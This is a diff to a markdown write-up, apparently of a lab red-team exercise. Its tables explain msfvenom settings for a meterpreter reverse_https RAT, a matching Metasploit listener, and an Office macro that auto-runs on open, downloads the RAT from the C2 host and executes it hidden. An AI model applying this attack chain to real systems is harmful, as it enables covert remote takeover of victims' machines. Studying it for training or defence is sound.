@@ -47,19 +47,19 @@ python3 -m http.server 8080
 
 | Parameter | Value | Justification |
 |:---|:---|:---|
-| `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches targets architecture and HTTPS encapsulates C2 traffic in TLS to evade network inspection |
-| `LHOST=192.168.92.136` | Kali IP | Specifies the C2 server address the RAT will connect to |
-| `LPORT=14000` | Port | High port that avoids the same security checks that lower or more well-known ports will have |
-| `-f exe` | Output format | Produces a Windows executable for direct execution |
-| `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb, also note this must match file retrieved in macro code |
+| `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches targets architecture and HTTPS encapsulates C2 traffic in TLS to evade network inspection. |
+| `LHOST=192.168.92.136` | Kali IP | Specifies the C2 server address the RAT will connect to. |
+| `LPORT=14000` | Port | High port that avoids the same security checks that lower or more well-known ports will have. |
+| `-f exe` | Output format | Produces a Windows executable for direct execution. |
+| `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb, also note this must match file retrieved in macro code. |
 
 | Parameter | Value | Justification |
 |:---|:---|:---|
-| `exploit/multi/handler` | Module | Generic listener compatible with any msfvenom-generated payload |
-| `set payload windows/x64/meterpreter/reverse_https` | Payload | Must mirror the payload used during generation exactly or the connection will be rejected |
-| `set LHOST 192.168.92.136` | Kali IP | Must match the LHOST used during RAT generation |
-| `set LPORT 14000` | Port | Must match the LPORT used during RAT generation |
-| `exploit -j` | Run as job | Allows the console to remain interactive while waiting for incoming connections |
+| `exploit/multi/handler` | Module | Generic listener compatible with any msfvenom-generated payload. |
+| `set payload windows/x64/meterpreter/reverse_https` | Payload | Must mirror the payload used during generation exactly or the connection will be rejected. |
+| `set LHOST 192.168.92.136` | Kali IP | Must match the LHOST used during RAT generation. |
+| `set LPORT 14000` | Port | Must match the LPORT used during RAT generation. |
+| `exploit -j` | Run as job | Allows the console to remain interactive while waiting for incoming connections. |
 
 **Macro Creation:**
 
@@ -86,10 +86,10 @@ End Sub
 ```
 | Step | Component | Purpose |
 |:---|:---|:---|
-| 1 | `AutoOpen()` | Triggers automatically on document open, no user interaction required |
-| 2 | `MSXML2.XMLHTTP` | Performs synchronous HTTP GET to retrieve `RATa.exe` from the C2 server |
-| 3 | `ADODB.Stream` | Writes raw binary response to disk at `%USERPROFILE%\Documents\launcher.exe` |
-| 4 | `WScript.Shell` | Silently executes the binary via `cmd /c` with hidden window flag (`0`) |
+| 1 | `AutoOpen()` | Triggers automatically on document open with no user interaction required. |
+| 2 | `MSXML2.XMLHTTP` | Performs HTTP GET to retrieve `RATa.exe` from the C2 server. |
+| 3 | `ADODB.Stream` | Writes raw binary response to disk at `%USERPROFILE%\Documents\launcher.exe`. |
+| 4 | `WScript.Shell` | Silently executes the binary via `cmd /c` with hidden window flag (`0`). |
 
 **Session Output Analysis:**
 Upon execution, the following session was established:
@@ -98,23 +98,14 @@ Upon execution, the following session was established:
 
 <img width="328" height="38" alt="image" src="https://github.com/user-attachments/assets/8bfc558a-49bb-40e8-ae2c-b282924b4300" />
 
-*   **ID:** Unique identifier for the session.
-*   **Type:** `meterpreter` indicates full-featured agent connection.
-*   **Information:** `DESKTOP-H53BPAA\Apollo @ DESKTOP-H53BPAA` confirms initial foothold as standard user.
-
-
 | Field | Description |
 |:---|:---|
-| `Id` | Unique numeric identifier for the session within the current msfconsole instance |
-| `Name` | Optional user-assigned label for the session |
-| `Type` | Session type — `meterpreter` indicates a full-featured agent with post-exploitation capabilities |
-| `Information` | Displays the user context and hostname the session is running under |
-| `Connection` | Shows the C2 IP:port → target IP:port connection tuple |
-| `Via` | The exploit and payload module used to establish the session |
-
-
-
-
+| `Id` | Unique numeric identifier for the session within the current msfconsole instance. |
+| `Name` | Optional user-assigned label for the session, N/A in this case. |
+| `Type` | Session type `meterpreter` indicates a full-featured agent with post-exploitation capabilities. |
+| `Information` | Displays the user context and hostname the session is running under. |
+| `Connection` | Shows the C2 IP:port → target IP:port connection tuple. |
+| `Via` | The exploit and payload module used to establish the session. |
 
 ### Phase 2: Enumeration
 **Modules Executed:**
